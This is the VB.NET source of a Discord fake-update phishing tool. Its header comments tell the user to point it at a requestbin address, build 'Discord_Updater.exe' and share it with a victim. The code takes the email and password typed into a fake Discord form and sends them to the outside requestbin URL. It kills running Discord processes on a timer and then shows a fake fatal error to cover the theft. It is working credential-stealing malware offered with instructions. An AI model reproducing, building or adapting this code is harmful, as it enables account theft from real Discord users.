Public Class Form1

'___  ____________________ _   _   ___  __   __
'|  \/  |  _  | ___ \ ___ \ | | | / _ \ \ \ / /
'| .  . | | | | |_/ / |_/ / |_| |/ /_\ \ \ V / 
'| |\/| | | | |    /|  __/|  _  ||  _  | /   \ 
'| |  | \ \_/ / |\ \| |   | | | || | | |/ /^\ \
'\_|  |_/\___/\_| \_\_|   \_| |_/\_| |_/\/   \/

                                               'Created By Morphax

    '!!!! I have no responsibility for the use of the program  !!!!
    'This is a Discord fake update phising tool.
    'You have to take a requestbin to use it. For take it (requestbin.net)
    'To use it you have to change the value of the reqbinurl varible to your requestbin.net address,and build the code.
    'Your "Discord_Updater.exe" will be in "Discord Guncelleme Sihirbazı\Discord Guncelleme Sihirbazı\bin\Debug\" folder
    'If you want to make it more realistic,after build it , upload to a discord server and take the url and share with the victim.
    'To look at the data's, type requestbin.net/r/RequestbinAddress?inspect to take the username/password data.
    'Requestbins have a limit (2 day,20 request max. for the "requestbin.net")
    '!!!! I have no responsibility for the use of the program  !!!!


    Dim reqbinurl As String
    Dim mouse_move As System.Drawing.Point
    Dim password As String
    Dim email As String
    Dim request As String

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer3.Start()

        '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        'YOU CAN CHANGE THE VALUE HERE

        'THE URL MUST BE LİKE
        'https://requestbin.net/r/jkdjfkjkfd
        '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

        reqbinurl = ("https://requestbin.net/r/g5b8hqn2")

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Hide()

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Maximized
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.WindowState = FormWindowState.Minimized

    End Sub

    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove

        Button1.BackColor = Color.FromArgb(35, 39, 42)

    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint


    End Sub

    Private Sub Panel2_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel2.MouseDown
        mouse_move = New Point(-e.X, -e.Y)
    End Sub

    Private Sub Panel2_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel2.MouseMove
        If (e.Button = Windows.Forms.MouseButtons.Left) Then
            Dim mposition As Point
            mposition = Control.MousePosition
            mposition.Offset(mouse_move.X, mouse_move.Y)
            Me.Location = mposition
        End If

        Button1.BackColor = Color.FromArgb(72, 75, 81)

    End Sub

    Private Sub Panel2_Move(sender As Object, e As EventArgs) Handles Panel2.Move

    End Sub

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint

    End Sub

    Private Sub Button2_Click_1(sender As Object, e As EventArgs) Handles Button2.Click
        Timer3.Stop()
        email = (TextBox1.Text)
        password = (TextBox2.Text)
        request = ("?" & "e-mail:(" & email & ")" & " " & "password:(" & password & ")")
        WebBrowser1.Navigate(reqbinurl & request)
        Timer1.Start()
    End Sub

    Private Sub Button2_MouseMove(sender As Object, e As MouseEventArgs) Handles Button2.MouseMove
        Button2.BackColor = Color.FromArgb(114, 137, 218)
    End Sub

    Private Sub WebBrowser1_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs) Handles WebBrowser1.DocumentCompleted

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Stop()

        MessageBox.Show("FATAL ERROR: Failed to connect with local discord file", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
        Form2.Close()
        Me.Close()
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs)
        Form2.Show()
    End Sub

    Private Sub Button1_MouseMove(sender As Object, e As MouseEventArgs) Handles Button1.MouseMove
        Button1.BackColor = Color.Brown
    End Sub

    Private Sub Button3_MouseEnter(sender As Object, e As EventArgs) Handles Button3.MouseEnter

    End Sub

    Private Sub Button3_MouseMove(sender As Object, e As MouseEventArgs) Handles Button3.MouseMove
        Button1.BackColor = Color.FromArgb(72, 75, 81)

    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Dim myProccess() As Process = System.Diagnostics.Process.GetProcessesByName("Discord")
        For Each myKill As Process In myProccess
            myKill.Kill()
        Next
    End Sub
End Class
